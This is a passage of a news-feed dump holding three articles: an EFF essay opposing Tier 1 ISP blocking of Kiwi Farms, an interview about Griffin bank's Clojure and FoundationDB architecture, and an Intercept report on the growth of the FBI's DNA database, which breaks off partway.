  <div><p>Entrusting our speech to multiple different corporate actors is always risky. Yet given how most of the internet is currently structured, our online expression largely depends on a set of private companies ranging from our direct Internet service providers and platforms, to upstream ISPs (sometimes called Tier 2 and 3), all the way up to Tier 1 ISPs (or the Internet backbone) that have no direct relationships with most users.</p>
<p>Tier 1 ISPs play a unique role in the internet “stack,” because numerous other service providers depend on Tier 1 companies to serve their customers. As a result, Tier 1 providers can be especially powerful chokepoints—given their reach, their content policies can affect large swaths of the web. At the same time given their distant relationship to speakers, Tier 1 ISPs have little if any context to make good decisions about their speech.</p>
<p>At EFF, we have long represented and assisted people from around the world—and across various political spectrums—facing censorship. That experience tells us that one of the most dangerous types of censorship happens at the site of a unique imbalance of power in the structures of the internet: when an internet service is both necessary for the web to function and simultaneously has no meaningful alternatives. That’s why EFF has long argued that we must “<a href="https://protectthestack.org/">protect the stack</a>” by saying no to infrastructure providers policing internet content. We’ve warned that endorsing censorship in one context can (and does) come back to bite us all when, inevitably, that same approach is used in another context. Pressure on basic infrastructure, as a tactic, will be re-used, inevitably, against unjustly marginalized speakers and forums. <a href="https://protectthestack.org/">It already is</a>.&nbsp;&nbsp;</p>
<p>So we were concerned when we started hearing from multiple sources that Hurricane Electric, a Tier 1 ISP, is interfering with traffic. Confirmation of the details has been difficult, in part because Hurricane itself has refused to respond to our queries, but it appears that the company is partially denying service to a direct customer, a provider called Crunchbits, in order to disrupt traffic to a site that is several steps away in the stack. And it is justifying that action because activity on the site reportedly violates Hurricane’s “acceptable use policy”—even though Hurricane has no direct relationship with that site. Hurricane argues that the policy requires its direct customers to police <em>their </em>customers as well as themselves.</p>
<p>If the site in question were Reddit, or Planned Parenthood, or even EFF, the internet would be up in arms. It is not, and it’s not hard to see why. The affected site is an almost universally despised forum for hateful speech and planning vicious attacks on vulnerable people: Kiwi Farms. For many, the natural response is to declare good riddance to bad rubbish—and understandably so.</p>
<p>At EFF, our mission and history requires us to look at the bigger picture, and sound the alarm about the risks even when the facts are horrific.</p>
<p>That means we need to say it even if it’s not comfortable: Hurricane Electric is wrong here.&nbsp; It gives us no joy to call Hurricane on this, not least because many will perceive it as an implicit defense of the KF site. <em>It is not.</em> A site that provides a forum for gamifying abuse and doxxing, whose users have celebrated on its pages the IRL deaths of the targets of their harassment campaigns, deserves no sympathy.&nbsp; We fully support criminal and civil liability for those who abuse and harass others.</p>
<p>But just because there’s a serious problem doesn’t mean that every response is a good one.&nbsp; And regardless of good intentions, Hurricane’s role as a Tier 1 ISP means that their interference is a dangerous step. Let us explain why.</p>
<p>For one thing, Tier 1 ISPs like Hurricane are often monopolies or near-monopolies, so users have few alternatives if they are blocked. Censorship is more powerful if you don’t have somewhere else to go.&nbsp; To be clear, at time of writing, there are two mirrored instances of KF online: one on the clear web at a country code top-level domain, and the other an onion service on the Tor network. So right now this isn’t a “lights out” situation for KF, and generally the Tor network will prevent that from happening entirely. The so-called “dark web” has plenty of deserved ill repute, however, so although it is resistant to censorship by Tier 1 ISPs, it is not a meaningful option for many, much less an accessible one.</p>
<p>Which brings us to the second point: this approach is usually a one-way ratchet. Once an ISP indicates it’s willing to police content by blocking traffic, more pressure from other quarters will follow, and they won’t all share your views or values. For example, an ISP, under pressure from the attorney general of a state that bans abortions, might decide to interfere with traffic to a site that raises money to help people get abortions, or provides information about self-managed abortions. Having set a precedent in one context, it is very difficult for an ISP to deny it in another, especially when even considering the request takes skill and nuance.&nbsp; We all know how lousy big user-facing platforms like Facebook are at content moderation—and that’s with significant resources. Tier 1 ISPs don’t have the ability or the incentive to build content evaluation teams that are even as effective as those of the giant platforms who know far more about their end users and yet <a href="https://www.onlinecensorship.org/">still engage in harmful censorship</a>. ISPs like Hurricane Electric are bound to be far <em>worse</em> than Facebook and its peers at sorting bad content from good, which is why they should not open this door.</p>
<p>Finally, site-blocking, whatever form it takes, almost inevitably cuts off legal as well as illegal speech. It cuts with a chain saw rather than a scalpel.</p>
<p>We know that many believe that KF is uniquely awful, so that it is justifiable to take measures against them that we wouldn’t condone against anyone else. The thing is, that argument doesn’t square with reality, online or offline.&nbsp; Crossing the line to Tier 1 blocking won’t just happen once.</p>
<p>To put it even more simply: When a person uses a room in a house to engage in illegal or just terrible activity, we don’t call on the electric company to cut off the light and heat to the entire house, or the post office to stop delivering mail. We know that this will backfire in the long run. Instead, we go after the bad guys themselves and hold them accountable.</p>
<p>That’s what must happen here. The cops and the courts should be working to protect the victims of KF and go after the perpetrators with every legal tool at their disposal. We should be giving them the resources and societal mandate to do so. Solid enforcement of existing laws is something that has been sorely lacking for harassment and abuse online, and it’s one of the reasons people turn to censorship strategies. Finally, we should enact strong data privacy laws that target, among others, the data brokers whose services help enable doxxing.</p>
<p>In the meantime, Tier 1 ISPs like Hurricane should resist the temptation to step in where law enforcement and legislators have failed. The firmest, most consistent approach infrastructure chokepoints like ISPs can take is to simply refuse to be chokepoints at all. Ultimately, that’s also the best way to safeguard human rights. We do not need more corporate speech police, however well-meaning.</p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Griffin - A fully-regulated, API-driven bank, with Clojure (333 pts)]]></title>
            <link>https://www.juxt.pro/blog/clojure-in-griffin/</link>
            <guid>37313183</guid>
            <pubDate>Tue, 29 Aug 2023 20:06:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.juxt.pro/blog/clojure-in-griffin/">https://www.juxt.pro/blog/clojure-in-griffin/</a>, See on <a href="https://news.ycombinator.com/item?id=37313183">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
      <p><a href="https://griffin.com/">Griffin</a> is a banking-as-a-service platform and part of the new wave of API-driven banking. Their services allow Fintech businesses to integrate banking features quickly and securely. In March 2023, Griffin was granted their UK banking license by the Financial Conduct Authority, making them a fully-regulated UK bank.</p>
<p>We caught up with Allen Rohner, Griffin Co-founder and CTO (also Co-founder of CircleCI), to discuss how they’ve built a bank, from the ground up, using Clojure.</p>


<img alt="Griffin" width="300" height="68" src="https://www.juxt.pro/_astro/griffin-logo-on-light.ca24a593_UHLTP.png" loading="lazy" decoding="async">
<img alt="Griffin" width="300" height="68" src="https://www.juxt.pro/_astro/griffin-logo-on-dark.9075282a_1rKtSY.png" loading="lazy" decoding="async">
<p><strong>Joe: So what does Griffin do?</strong></p>
<p><strong>Allen:</strong> We are a fully regulated UK bank. We call it <em>“the bank you can build on”</em>. That means we’re like AWS for banking. So there’s an API to onboard a customer, an API to create a bank account, an API to make a payment.</p>
<p>By law, fintechs must work with a bank to do these things, and right now that means a legacy high street bank with mainframes. Griffin is the bank <em>plus</em> technology platform that all future fintechs would build on.</p>
<p>We got our license in March and we’re still in what’s called ‘mobilization’, which is basically like training wheels. The training wheels come off when we complete an audit, raise some more money, and finish writing the code. That should be Q3 or Q4 this year.</p>
<p><strong>Joe: So presumably, the mission of Griffin would be to disrupt the market, have a more modern set of technologies, a better, faster delivery capability than some of the existing banks?</strong></p>
<p><strong>Allen:</strong> Yeah, exactly. We kind of joke that we’re a tech company that happens to have a banking license.</p>
<p><strong>Joe: How did Clojure end up becoming the language of choice for the platform?</strong></p>
<p><strong>Allen:</strong> I mean, the flippant answer is: because I liked it. The serious answer is: Clojure is the right choice because it’s immutable, it’s powerful; it’s a good fit for financial services and anything that needs an audit log.</p>
<span text-content="Clojure is the right choice because it’s immutable, it’s powerful; it’s a good fit for financial services and anything that needs an audit log."></span>
<p>There is a longer story about how I arrived at Clojure. I graduated from college (you UK folks would say ‘university’) in 2005, and I got a boring enterprise software job and, uh, was pretty unhappy with it. Then I started reading Paul Graham, and he was writing about how you should both start a startup and work in Lisp. And so I said, Hey, let’s do both of those. At the time he was saying, don’t use Common Lisp because it’s old, fragmented, and there wasn’t a good implementation that did everything. There was like one implementation that was good at threads and another implementation that was good at, let’s say, graphics. And if you wanted to do graphics and threads, you were outta luck. He was saying, <em>“Wait, wait, I’m gonna work on this”</em>.</p>
<p>The problem with Common Lisp is that it needed a BDFL like Python, and there wasn’t one yet. And so PG was saying, well, <em>“I’ll start Arc”</em>, but he’d been talking about that for multiple years. So then I started writing my own Lisp, got about halfway into it, and then I saw that Rich released Clojure. That was probably 2007 - one of his first announcements.</p>
<p>I looked at Clojure and I said, <em>“Well, that’s way better than what I would’ve written”</em>. So then I did a startup that didn’t go anywhere, and then I founded CircleCI in 2011. This is also getting into the history of Griffin as well. I hired David [Jarvis], my co-founder at Griffin, as engineer number nine or so at CircleCI.</p>

<img alt="Griffin Founders, Allen Rohner and David Jarvis" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-founders.0ea6690e_Z3zqd4.jpg" loading="lazy" decoding="async">
<p>David later went on to work at Standard Treasury, which was a YC company that was trying to sell modern APIs to US banks. That ended up not working out. Too late in Standard Treasury’s runway, they said, <em>“Instead of trying to sell the banks, let’s <em>become</em> a bank”</em>. They figured that out too late. David always liked the idea and he saw Monzo get authorized in 2017. He said, <em>“Well, if Monzo can get authorized for this retail bank, then we can get authorized for this tech infrastructure bank”</em>.</p>
<p>So, by this point, I’d been using Clojure for a decade and it worked great at CircleCI and it was a very good fit for financial services.</p>
<p><strong>Joe: So you were coming to Clojure from a Lisp background. Had you worked with JVM languages before that?</strong></p>
<p><strong>Allen:</strong> Not really. I had, maybe, three months of Java before using Clojure. Before that my prior experience was C and C++, Python, and Ruby.</p>
<p><strong>Joe: So did you see the JVM as a benefit or a drawback? People talk about the ‘JVM tax’ (on resources like memory). Were you thinking that way?</strong></p>
<p><strong>Allen:</strong> I did at first, but my perspective has changed. For the first couple of years I didn’t appreciate it [the JVM]. But now I’ve seen other niche startup languages try to grow, and they run into the library problems and run into problems making the compiler and the runtime fast. It’s become obvious to me that the JVM is a huge benefit.</p>
<span text-content="[N]ow I've seen other niche startup languages try to grow, ... it's become obvious to me that the JVM is a huge benefit."></span>
<p><strong>Joe: When you were working on CircleCI and also when you were starting Griffin, were you mindful that this choice of language and technology would have an impact? Did you feel that using Clojure said something about the business?</strong></p>
<p><strong>Allen:</strong> Yeah, I think it definitely says something about the company, something I thought was good.</p>
<p>If we had picked Python, it’s very boring and reliable, and the same could be said of Java. But you’re picking the lowest common denominator. I would say high performers, and the best programmers are often people that will only work in niche languages.</p>
<p>The problem is, there are good Java programmers, but there are also thousands of terrible Java programmers. If you pick the right niche, it’s easier to find the high-end talent. I think Paul Graham also made a very strong case that in a startup, you should be using the most powerful language you can, and that is Clojure.</p>
<h2 id="foundationdb">FoundationDB</h2>
<p><strong>Joe: How would you describe the architecture of the Griffin platform?</strong></p>
<p><strong>Allen:</strong> We’re running Clojure on Kubernetes, on AWS, and we are almost entirely event sourcing.</p>
<p>The database is <a href="https://www.foundationdb.org/">FoundationDB</a>, and this additional proprietary thing that I really need to open source (I ported Datascript to FoundationDB). It’s a Datomic-like layer that writes directly to Foundation. I should talk about Foundation, cause it’s awesome.</p>
<p>FoundationDB is a strict-serializable key value store that supports transactions. It was originally a Silicon Valley startup and then got acquired by Apple in 2015. It kind of disappeared, and then Apple re-open-sourced it around 2018.</p>
<p>Apple uses it in production for iCloud. They’ve benchmarked it running like a million transactions a second. It’s strict serializable, which means that it’s at the <a href="https://jepsen.io/consistency">highest correctness level for databases</a>.</p>
<p>So Foundation is a very good database. It’s very fast, and it’s intentionally built to be built upon. The normal API is just ‘get a key’, ‘set a key’. It’s not SQL. I ported Datascript to that. So now we have atomic queries, reading and writing on this strict serializable data store with transactions.</p>
<p>The database supports concurrent writes (not a single writer), and we need to go over a thousand transactions per second, so we’re very happy with that.</p>

<img alt="Griffin teamwork" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-dev.c17526da_1xglE.jpg" loading="lazy" decoding="async">
<h2 id="event-sourcing">Event-sourcing</h2>
<p><strong>Allen:</strong> We also have an event sourcing model. Every input to the system is an event. So like every API request, every webhook from a third party, it turns into an event. Those go into a message log. For us an event is just a Clojure map with a type field and some keys, values, and specs.</p>
<p>The entire system is just reactions to events. We have these small log processors, or ‘procs’ for short. The proc declares <em>“I listen for message type A, and then in response to that, I will emit either B or C”</em>. And each one has its own little private state.</p>
<p>You can build up a graph of how the messages flow through the system. Events will flow until you reach a terminal node in the graph. For example, a web server says, <em>“I will receive http events and write them. Please make a payment and I will listen for either payment created event or a payment rejected event. When I see one of those, I will respond back to the client”</em>. That’s a Netty asynchronous http handler, so an asynchronous payment response back to the client.</p>
<p><strong>Joe: So you have many independent procs all receiving and acting on those events, and producing their own. Yeah. How are those events conveyed?</strong></p>
<p><strong>Allen:</strong> They’re all written to Foundation, so they go into the log there and each little log processor has its own private data, like its own namespace in the database, where they emit messages. The procs are watching in Foundation for a certain type of event to be written, and they are writing their own events back to Foundation. Foundation has a feature for watching when DB keys change, so it’s efficient to build a reactive system on top of that.</p>
<p>If you had a database and some separate messaging like ZeroMQ, Rabbit, Kafka, you’re going to get race conditions. There’s always going to be a potential race where you have two messages - one is going to the disk and one is going to the network. If someone else is listening and sees both of them, they could potentially get them in either order. So it’s much, much simpler to just have one path. Foundation is really fast, so it works great.</p>
<p><strong>Joe: Do you have log processors as independent services, or are things more monolithic?</strong></p>
<p><strong>Allen:</strong> It’s a monorepo. And right now many log processes run in the same JVM for efficiency. They are independent, so they could be run each one in its own JVM process, but right now we’re running low hundreds of them in a single JVM.</p>
<p>One architectural choice that we made that I highly, highly recommend is: Keep your business logic as dumb and clean as possible. For these individual log processors, if you look at the namespace, it’s almost entirely pure Clojure. No third-party libraries, and very few side effects.</p>
<span text-content="One architectural choice that we made that I highly, highly recommend is: Keep your business logic as dumb and clean as possible... We have a function that takes a Clojure map in and I write a Clojure map out."></span>
<p>A log processor is function that takes a Clojure map in and returns one or more Clojure maps out. There’s a protocol for proc state, but it’s a protocol so you don’t know what’s on the other side of that. So yeah, keep the business logic as clean as possible, with as few dependencies as possible, and then interact with the outside world via protocols.</p>
<p>So for example, for the proc state protocol, it could either write to an in-memory database, or it can write to Foundation. It’s great because you can change out your implementation at test time.</p>
<p><strong>Joe: I see. I guess there are two patterns that people often use, aren’t there?</strong></p>
<p><strong>One is keeping all interactions with the outside world at the outer edges (e.g. functional core, imperative shell). Another is more like dependency injection, where we interact with the outside world from anywhere, but put in some abstractions, so that we can swap out the implementation.</strong></p>
<p><strong>So you’re doing the latter? You <em>do</em> allow those interactions to happen within the business logic, but you make sure to always have a protocol in front of those interactions so that you can swap out the implementation.</strong></p>
<p><strong>Allen:</strong> Exactly. Also, the interface to the outside world is as small as possible.</p>
<p>For the vast majority of procs, the only thing they can do is write to their own internal state and emit messages. That’s it. They can’t make network calls. They can’t call AWS. They don’t do anything else. So when we do wanna talk to the outside world, there’s a special kind of proc that has a dispatch handler that is dedicated to talk to that external system. So, this one talks to AWS, this one talks to our clearing bank, this one talks to some other API.</p>
<p>That separation is very useful.</p>
<h2 id="libraries">Libraries</h2>
<p><strong>Joe: What’s the typical selection of libraries and things from the Clojure ecosystem that you’re using?</strong></p>
<p><strong>Allen:</strong> So in the business logic itself, very little. Outside of that, for instance in the API web server or the service gateway (where we talk to the outside world), it’s ring, netty, reitit. We’re using Clojure spec extensively. For AWS we’re using the Cognitect aws-api library.</p>
<p><strong>Joe: And do you use any library for managing the parts that interact with the outside world? Dependency injection or wiring up the application?</strong></p>
<p><strong>Allen:</strong> The thing we use is based on a blog post called <a href="https://medium.com/@maciekszajna/reloaded-workflow-out-of-the-box-be6b5f38ea98">closeable</a>. It’s great.</p>
<p>Five years ago, this guy wrote a blog post. His argument was that you don’t need Component or Integrant, or any of that. All you need is <code>with-open</code>. You get lexical scope, you get the right-hand side of declaring your bindings to construct things. And then because of how the introduction of bindings works, it forces you to declare your things in order.</p>
<span text-content="[Y]ou don't need Component or Integrant, or any of that. All you need is with-open."></span>
<p>There’s a couple of little helpers. One of them is for things that have state but don’t implement <code>Closeable</code>, or for things that are stateless, so you can declare them in the <code>with-open</code> block.</p>
<p>And so that’s it. You’re done. It’s very simple, and very clean.</p>
<h2 id="hiring">Hiring</h2>
<p><strong>Joe: You spoke earlier about how, often, the best programmers work in niche languages and it means that using marks your business out. How do you find hiring and finding good engineers? Do you have any issues?</strong></p>
<p><strong>Allen:</strong> I’m really happy with it. I joke about it sometimes, but it’s not a joke, it’s real: if we said we were hiring for Java programmers, we’d get like a thousand CVs and you’d have 10 good ones. If we’re hiring for Clojure, we’ll get 13 CVs and 10 good ones. You’re going to find high quality people and you’re gonna do less work for it.</p>
<p>We’re also remote, which I think is important because when you’re dealing with a smaller hiring pool, and you also constrain to geography, that’s hard. If you’re a remote company, then your hiring pool is, either everyone on earth or everyone within three time zones, or everyone in Europe, whatever. You’re at a good sized pool.</p>
<p><strong>Joe: Yes, and it’s very rare that a company needs to hire, say, a hundred engineers in a short space of time.</strong></p>
<p><strong>Allen:</strong> Yeah, I think that’s an anti-pattern.</p>
<p><strong>Joe: What’s the size of your team at the moment? And what is that geographical split?</strong></p>
<p><strong>Allen:</strong> There are maybe 70 in the company, and 22-24 or so in Engineering.</p>
<p>In engineering, it’s maybe two thirds in the UK and then a third in the EU. We’ve got, say, four in Germany, four in Sweden, one in Ireland. And then people over most of the UK. Our headquarters are in London, but most of the developers are in the UK <em>outside</em> of London.</p>

<img alt="The Griffin Team" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-team.2ec5c1ae_Z11BDED.jpg" loading="lazy" decoding="async">
<h2 id="testing-for-correctness">Testing for correctness</h2>
<p><strong>Joe: How do you feel about the direction of Clojure at the moment? Are there things that you would like to see happen in the Clojure space? (either in the core or in the ecosystem). Is there anything that you feel is missing, or any new direction you are interested to go in?</strong></p>
<p><strong>Allen:</strong> So a thing I’ve been banging around for a while, but haven’t really made any progress on yet is around testing of systems. The FoundationDB team have a great video on how they do testing, but the problem is that this approach is hard to do as a library.</p>
<p>Foundation is a distributed system and almost every system that any of us work with on the internet today is a distributed system. Cause, you know, even if you have one process talking to AWS, then congratulations, you’re now a networked system!</p>
<p>So there are two big problems that we have to deal with. One of them is race conditions, and the other is system errors. As a bank we have to be what is called ‘operationally resilient’, which really just means no downtime. But we’re dealing with people’s money, so we have to actually prove it. So, don’t go down, and when there is a problem, how do you prove that you’re not losing people’s money?</p>
<p>What the Foundation team did was build a simulator of the database. They have something like 20 different process types, so 20 different ‘roles’ within the Foundation cluster, and they wrote them as single-threaded C++ apps. Then they built an actor-model concurrency compiler on top of C++. Every single system call or network call that they make goes through a protocol, so they can inject errors. All of their multi-threading also happens through this actor model with the sending of messages.</p>
<p>With all this in place, they can then say, <em>“Oh, what happens if I send message A and then send message B, but then on the other end it arrives B and then A?”</em>. Or <em>“What happens if, in the middle of processing this message, I try to write to disk and I get an error?”</em>. They can inject errors anywhere in the system, deterministically.</p>
<p>You can think of it as kind of like test.check generative testing, where you have all non-determinism in the system seeded from a single random number that you control. You can control disk errors, network errors, and reordering of messages. I’m really interested in having something like that.</p>
<p>The problem right now is that there’s no way to control the behavior of the underlying Java threading libraries, nio, and writing to disk.</p>
<p><strong>Joe: Similar to Jepsen, in a way, where you can enumerate all of the possible error scenarios for a complex, distributed system, but rather than just controlling the environment to disconnect the network or stop writes to the disk, you also have total control over things like thread scheduling to enumerate all the possible internal outcomes too?</strong></p>
<p><strong>Allen:</strong> Yeah. It is very much in the same spirit as Jepsen. In Jepsen you set up like five VMs and say, <em>“Oh, well maybe I’ll kill this process”</em>, and maybe that turns up a bug and maybe it doesn’t. Jepsen is very ‘brute force’, and it’s hard to know when you’re done because you can’t inspect the database’s state, so you don’t know how much coverage you’re getting. How many times do you have to do it before you’re confident that you don’t have any bugs there?</p>
<p>The difference, if you have this environment where you have total control, is that you can enumerate system calls, or say, for all possible interleavings of messages, make sure this thing happens. And because it’s in memory, it’s extremely fast.</p>
<p><strong>Joe: Have you seen this going on successfully outside of Clojure and the JVM?</strong></p>
<p><strong>Allen:</strong> No. I don’t know if anyone is doing it aside from the FoundationDB team. They started and built that on day one. I think in the video they said they had that built before they were even writing database tables to disk. This is the kind of thing that gives us a lot of confidence in FoundationDB.</p>
<p><strong>Joe: Thanks a lot for speaking with us Allen. Finally, are you hiring?</strong></p>
<p><strong>Allen</strong>: We tend to go into a bit of a lull on interviewing during the summer due to holiday, but yes we’re hiring. Check out the <a href="https://griffin.com/careers">Griffin careers page</a> for info.</p>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The FBI Has Collected DNA Profiles for 21M People (111 pts)]]></title>
            <link>https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/</link>
            <guid>37312647</guid>
            <pubDate>Tue, 29 Aug 2023 19:27:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/">https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/</a>, See on <a href="https://news.ycombinator.com/item?id=37312647">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
    
<p><span>The FBI has</span> amassed 21.7 million DNA profiles — equivalent to about 7 percent of the U.S. population — according to <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/codis-ndis-statistics">Bureau data</a> reviewed by The Intercept.</p>



<p>The FBI aims to nearly double its current $56.7 million budget for dealing with its DNA catalog with an additional $53.1 million, according to its <a href="https://www.justice.gov/d9/2023-03/fbi_fy_24_pb_bud_sum_ii_omb_cleared_3-08-23.pdf">budget request</a> for fiscal year 2024. “The requested resources will allow the FBI to process the rapidly increasing number of DNA samples collected by the U.S. Department of Homeland Security,” the appeal for an increase says.</p>



<!-- BLOCK(pullquote)[0](%7B%22componentName%22%3A%22PULLQUOTE%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22pull%22%3A%22right%22%7D) --><blockquote data-shortcode-type="pullquote" data-pull="right"><!-- CONTENT(pullquote)[0] -->“When we’re talking about rapid expansion like this, it’s getting us ever closer to a universal DNA database.”<!-- END-CONTENT(pullquote)[0] --></blockquote><!-- END-BLOCK(pullquote)[0] -->



<p>In an April 2023 statement submitted to Congress to explain the budget request, FBI Director Christopher Wray cited several factors that had “significantly expanded the DNA processing requirements of the FBI.” He said the FBI collected around 90,000 samples a month — “over 10 times the historical sample volume” — and expected that number to swell to about 120,000 a month, totaling about 1.5 million new DNA samples a year. (The FBI declined to comment.)</p>



<div><p>The staggering increases are raising questions among civil liberties advocates.</p><p>“When we’re talking about rapid expansion like this, it’s getting us ever closer to a universal DNA database,” Vera Eidelman, a staff attorney at the American Civil Liberties Union who specializes in genetic privacy, told The Intercept. “I think the civil liberties implications here are significant.”</p></div>



<p>The rapid growth of the FBI’s sample load is in large part thanks to a Trump-era rule change that mandated the collection of DNA from migrants who were arrested or detained by immigration authorities. </p>



<!-- BLOCK(newsletter)[1](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) -->

<!-- END-BLOCK(newsletter)[1] -->



<h2 id="h-mission-creep-in-fbi-s-dna">Mission Creep in FBI’s DNA</h2>



<p>The FBI began building a DNA database as early as 1990. By 1998, it helped create a national database called Combined DNA Index System, or CODIS, that spanned all 50 states. Each state maintained its own database, with police or other authorities submitting samples based on their states’ rules, and CODIS allowed all the states to search across the entire country. At first, the collection of data was limited to DNA from people convicted of crimes, from crime scenes, and from unidentified remains.</p>



<p>Even those categories were <a href="https://www.nytimes.com/1998/10/12/us/fbi-set-to-open-its-dna-database-for-fighting-crime.html">controversial at the time</a>. When CODIS was launched nationally, most states did not submit DNA from all people convicted of felonies; the only point of consensus among the states’ collection programs was to take DNA from convicted sex offenders.</p>



<p>“If you look back at when CODIS was established, it was originally for violent or sexual offenders,” Anna Lewis, a Harvard researcher who specializes in the ethical implications of genetics research, told The Intercept. “The ACLU warned that this was going to be a slippery slope, and that’s indeed what we’ve seen.”</p>



<p>Today, police have <a href="https://aizmanlaw.com/can-police-force-give-dna-sample-arrested/#:~:text=Police%20in%20all%2050%20states,never%20convicted%20of%20the%20offense.">the authority</a> to take DNA samples from anyone sentenced for a felony charge. In 28 states, police can take DNA samples from suspects arrested for felonies but who have not been convicted of any crime. In <a href="https://theintercept.com/2021/07/03/orange-county-prosecutors-dna-surveillance/">some cases</a>, police offer plea deals to reduce felony charges to misdemeanor offenses in exchange for DNA samples. Police are even acquiring DNA samples from unwitting people, as The Intercept <a href="https://theintercept.com/2023/08/18/gedmatch-dna-police-forensic-genetic-genealogy/">recently reported</a>.</p>



<p>“It changed massively,” Lewis said of the rules and regulations around government DNA collection. “You only have to be a person of interest to end up in these databases.”</p>



<p>The database is likely to continue proliferating as DNA technology becomes more sophisticated, Lewis explained, pointing to the advent of <a href="https://www.nytimes.com/2023/05/15/science/environmental-dna-ethics-privacy.html">environmental DNA</a>, which allows for DNA to be collected from ambient settings like wastewater or air.</p>



<p>“Just by breathing, you’re discarding DNA in a way that can be traced back to you,” Lewis said.</p>


<!-- BLOCK(promote-related-post)[2](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A1%7D) -->

<!-- END-BLOCK(promote-related-post)[2] -->



<p>While this might sound like science fiction, the federal government has already embraced the technology. In May, the National Oceanic and Atmospheric Administration offered <a href="https://sam.gov/opp/d3d52d3abced4f9281085b858703df70/view">a contract</a> for laboratory services to assist with “autonomously collected eDNA testing”: environmental DNA testing based on samples that are no longer even manually collected.</p>



<p>Until recently, the U.S. DNA database surpassed even that of authoritarian China, which launched an ambitious DNA collection program in 2017. That year, the BBC <a href="https://www.bbc.com/news/world-asia-china-39945220">reported</a>, the U.S. had about 4 percent of its population’s DNA, while China had about 3 percent. Since then, China announced a plan aimed at collecting between 5 and 10 percent of its male population’s DNA, according to a 2020 <a href="https://www.nytimes.com/2020/06/17/world/asia/China-DNA-surveillance.html">study</a> cited by the New York Times.</p>



<p>China has a record of abusing its DNA database for surveillance and crackdowns on dissent. The efforts have been aided by <a href="https://theintercept.com/2021/02/18/oracle-china-police-surveillance/">American technology</a> and <a href="https://theintercept.com/2022/09/13/china-tibet-police-dna-thermo-fisher/">expertise</a>. In 2021, the U.S. intelligence community <a href="https://www.nytimes.com/2021/10/22/us/politics/china-genetic-data-collection.html">raised alarms</a> about China’s widespread DNA collection, including foreigners’ genetic information.</p>


<!-- BLOCK(photo)[3](%7B%22componentName%22%3A%22PHOTO%22%2C%22entityType%22%3A%22RESOURCE%22%7D)(%7B%22scroll%22%3Afalse%2C%22align%22%3A%22bleed%22%2C%22bleed%22%3A%22xtra-large%22%2C%22width%22%3A%22auto%22%7D) --><div><!-- CONTENT(photo)[3] --> <p><img decoding="async" fetchpriority="high" width="2500" height="1667" src="https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?w=1024" alt="WASHINGTON, DC - JULY 12: FBI Director Christopher Wray testifies during a House Judiciary Committee hearing on &quot;oversight of the Federal Bureau of Investigation&quot; and alleged politicization of law enforcement on Capitol Hill in Washington, DC on July 12, 2023. (Photo by Shuran Huang for The Washington Post via Getty Images)" srcset="https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg 2500w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=300,200 300w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=768,512 768w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1024,683 1024w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1536,1024 1536w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=2048,1366 2048w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=540,360 540w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1000,667 1000w" sizes="(max-width: 2500px) 100vw, 2500px"></p><p>FBI Director Christopher Wray testifies during a House Judiciary Committee hearing on Capitol Hill in Washington, D.C., on July 12, 2023.</p>
<p>
Photo: Shuran Huang for The Washington Post via Getty Images</p><!-- END-CONTENT(photo)[3] --></div><!-- END-BLOCK(photo)[3] -->


<h2>“Cheaper, Easier, and Faster”</h2>



<p>The changes detailed by Wray include shifts in statutory and regulatory requirements, with the bulk of new samples coming from a new policy mandating collection of DNA from people arrested or detained by U.S. Customs and Border Protection, a Department of Homeland Security agency. The new DHS policy, however, only explains part of the rapid growth of the FBI’s DNA database.</p>



<p>Whereas DNA analysis once had to be conducted in a lab by a cumbersome manual process of manually matching DNA strands that took months, the process has since been fully automated. Under <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/rapid-dna">rapid DNA analysis</a>, a DNA profile can be developed in one to two hours after a simple swab of one’s inner cheek without a lab or human involvement.</p>



<p>“When surveillance technology gets cheaper, easier, and faster to use,” said Eidelman, of the ACLU, “it tends to get used more — often in ways that are troubling.”</p>



<!-- BLOCK(pullquote)[4](%7B%22componentName%22%3A%22PULLQUOTE%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22pull%22%3A%22center%22%7D) --><blockquote data-shortcode-type="pullquote" data-pull="center"><!-- CONTENT(pullquote)[4] -->“When surveillance technology gets cheaper, easier, and faster to use, it tends to get used more — often in ways that are troubling.”<!-- END-CONTENT(pullquote)[4] --></blockquote><!-- END-BLOCK(pullquote)[4] -->



